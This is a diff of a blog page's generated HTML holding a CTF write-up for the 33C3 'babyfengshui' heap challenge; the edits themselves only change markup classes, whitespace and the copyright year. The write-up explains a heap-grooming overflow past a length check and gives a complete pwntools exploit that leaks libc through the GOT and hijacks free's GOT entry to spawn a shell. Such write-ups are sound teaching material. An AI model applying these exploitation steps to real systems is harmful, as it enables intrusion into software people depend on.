@@ -307,7 +307,7 @@
 <p>32 bit ELF, with Partial RELRO, canary &amp; NX enabled, No PIE</p>
 
 <p>program menu:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./babyfengshui
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./babyfengshui
 0: Add a user
 1: Delete a user
 2: Display a user
@@ -315,20 +315,20 @@
 4: Exit
 </code></pre></div></div>
 <p>Add a user:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 0
 size of description: 50 &lt;-- max length of description
 name: AAAA 
 text length: 12 &lt;-- actual length of description
 text: 1234
 </code></pre></div></div>
 <p>Show a user:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 2
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 2
 index: 0 &lt;-- user's index
 name: AAAA
 description: 1234
 </code></pre></div></div>
 <p>Update a user:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 3
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 3
 index: 0
 text length: 10 &lt;-- new length of the description
 text: 1234567890
@@ -339,11 +339,11 @@ text: 1234567890
     <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">124</span><span class="p">];</span>
 <span class="p">};</span>
 </code></pre></div></div>
-<p>The program will free <code class="highlighter-rouge">user-&gt;desc</code> &amp; <code class="highlighter-rouge">user</code> while deleting a user. It also clear the pointer of the <code class="highlighter-rouge">user</code>, so there’s no Use-After-Free vulnerability.</p>
+<p>The program will free <code class="language-plaintext highlighter-rouge">user-&gt;desc</code> &amp; <code class="language-plaintext highlighter-rouge">user</code> while deleting a user. It also clear the pointer of the <code class="language-plaintext highlighter-rouge">user</code>, so there’s no Use-After-Free vulnerability.</p>
 
 <p>The program has some strange protection while setting the user’s description:</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// users = struct user *users[]
-</span><span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">[</span><span class="n">text_len</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span> <span class="p">)</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// users = struct user *users[]</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">[</span><span class="n">text_len</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span> <span class="p">)</span>
 <span class="p">{</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">"my l33t defenses cannot be fooled, cya!"</span><span class="p">);</span>
     <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
@@ -351,10 +351,10 @@ text: 1234567890
 <span class="n">printf</span><span class="p">(</span><span class="s">"text: "</span><span class="p">);</span>
 <span class="n">read_n</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">,</span> <span class="n">text_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
 </code></pre></div></div>
-<p>So <code class="highlighter-rouge">user-&gt;desc + text_len</code> must &lt; <code class="highlighter-rouge">user</code> (both <code class="highlighter-rouge">user-&gt;desc</code> and <code class="highlighter-rouge">user</code> are pointers). Guess it use this protection to avoid heap overflow.</p>
+<p>So <code class="language-plaintext highlighter-rouge">user-&gt;desc + text_len</code> must &lt; <code class="language-plaintext highlighter-rouge">user</code> (both <code class="language-plaintext highlighter-rouge">user-&gt;desc</code> and <code class="language-plaintext highlighter-rouge">user</code> are pointers). Guess it use this protection to avoid heap overflow.</p>
 
 <p>But what if we have the following heap memory layout?</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
             +-----------------------+
 userD-&gt;desc |                       |
             |                       |
@@ -375,12 +375,12 @@ userD-&gt;desc |                       |
             |                       |
             +-----------------------+
 </code></pre></div></div>
-<p>According to the protection, <code class="highlighter-rouge">userD-&gt;desc + text_len</code> should less than <code class="highlighter-rouge">userD</code>, <strong>which means it will be ok to overwrite the whole <code class="highlighter-rouge">userB</code> and <code class="highlighter-rouge">userC</code></strong>.</p>
+<p>According to the protection, <code class="language-plaintext highlighter-rouge">userD-&gt;desc + text_len</code> should less than <code class="language-plaintext highlighter-rouge">userD</code>, <strong>which means it will be ok to overwrite the whole <code class="language-plaintext highlighter-rouge">userB</code> and <code class="language-plaintext highlighter-rouge">userC</code></strong>.</p>
 
-<p>It is possible to arrange the above heap memory layout if we’re familiar with malloc’s memory allocation. We can then exploit the heap overflow vulnerability and modify the <code class="highlighter-rouge">userB-&gt;desc</code> pointer, making us able to do the <strong>read/write anywhere</strong> attack. After that is pretty simple, we leak the libc’s base address and hijack <code class="highlighter-rouge">free</code>’s GOT to get the shell.</p>
+<p>It is possible to arrange the above heap memory layout if we’re familiar with malloc’s memory allocation. We can then exploit the heap overflow vulnerability and modify the <code class="language-plaintext highlighter-rouge">userB-&gt;desc</code> pointer, making us able to do the <strong>read/write anywhere</strong> attack. After that is pretty simple, we leak the libc’s base address and hijack <code class="language-plaintext highlighter-rouge">free</code>’s GOT to get the shell.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -391,13 +391,13 @@ userD-&gt;desc |                       |
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./babyfengshui_noalarm"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc-2.19.so"</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
@@ -426,35 +426,35 @@ userD-&gt;desc |                       |
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    
+    <span class="c1">#r = process(ELF_PATH)
+</span>    
     <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">12</span><span class="p">)</span>
     <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"b"</span><span class="o">*</span><span class="mi">12</span><span class="p">)</span> 
-    <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c"># user[2], desc = "sh\x00" (for later's GOT hijacking)</span>
-    <span class="n">del_user</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c1"># user[2], desc = "sh\x00" (for later's GOT hijacking)
+</span>    <span class="n">del_user</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="n">add_user</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"d"</span><span class="o">*</span><span class="mi">12</span><span class="p">)</span>
     <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]))</span> 
-    <span class="c"># now user[4]'s desc is user[0]'s desc (in previous)</span>
-    <span class="c"># user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt</span>
-
-    <span class="c"># leak address</span>
-    <span class="n">show_user</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># now user[4]'s desc is user[0]'s desc (in previous)
+</span>    <span class="c1"># user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt
+</span>
+    <span class="c1"># leak address
+</span>    <span class="n">show_user</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"description: "</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
     <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     
-    <span class="c"># change user[1]-&gt;desc into free@got.plt</span>
-    <span class="c"># hijack free's got, then free user[2] to get shell</span>
-    <span class="n">update_user</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]))</span>
+    <span class="c1"># change user[1]-&gt;desc into free@got.plt
+</span>    <span class="c1"># hijack free's got, then free user[2] to get shell
+</span>    <span class="n">update_user</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]))</span>
     <span class="n">update_user</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     <span class="n">del_user</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>
 
         
       </section>
@@ -563,7 +563,6 @@ userD-&gt;desc |                       |
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -583,7 +582,6 @@ userD-&gt;desc |                       |
 
         
           
-          
 
 
 
@@ -602,7 +600,6 @@ userD-&gt;desc |                       |
 </div>
 
         
-          
           
 
 
@@ -625,7 +622,6 @@ userD-&gt;desc |                       |
 
         
           
-          
 
 
 
@@ -646,6 +642,7 @@ userD-&gt;desc |                       |
         
       </div>
     </div>
+  
   
 </div>
 
@@ -696,7 +693,7 @@ userD-&gt;desc |                       |
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
